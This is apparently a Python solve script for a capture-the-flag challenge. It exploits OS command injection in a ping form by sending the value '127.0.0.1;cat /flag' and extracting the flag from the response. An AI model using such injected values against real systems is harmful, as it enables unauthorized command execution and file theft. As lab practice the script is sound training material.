#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))

import re
import sys
import html
import requests


# Change this URL when the challenge instance changes.
TARGET_URL = os.environ.get("GKD_URL") or ('http://127.0.0.1:33343')


def get_flag(base_url: str) -> str:
    base_url = base_url.rstrip('/') + '/'

    # 题目是 ping 命令拼接注入，ip 参数会被拼到 shell 命令里。
    payload = '127.0.0.1;cat /flag'

    r = requests.get(base_url, params={'ip': payload}, timeout=10)
    r.raise_for_status()

    text = html.unescape(r.text)
    m = re.search(r'TOGOGO-flag\{[^}]+\}', text)
    if not m:
        raise RuntimeError('未在响应中找到 flag，响应片段：\n' + text[:1000])
    return m.group(0)


def main() -> None:
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET_URL
    flag = get_flag(url)
    print(flag)


if __name__ == '__main__':
    main()
